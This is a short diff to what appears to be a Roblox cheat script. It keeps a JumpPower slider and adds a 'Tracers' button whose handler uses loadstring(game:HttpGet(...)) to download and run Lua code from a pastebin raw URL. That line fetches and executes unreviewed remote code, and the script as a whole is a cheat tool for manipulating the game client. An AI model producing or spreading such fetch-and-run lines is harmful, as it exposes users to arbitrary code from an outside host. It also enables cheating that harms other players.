@@ -12,3 +12,9 @@ end)
 plr:Slider("JumpPower", 1, 512, 50, function(v)
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
 end)
+
+-- Visuals Tab
+
+plr:Button("Tracers", true, function(v)
+    loadstring(game:HttpGet('https://pastebin.com/raw/94264n5P'))()
+end)
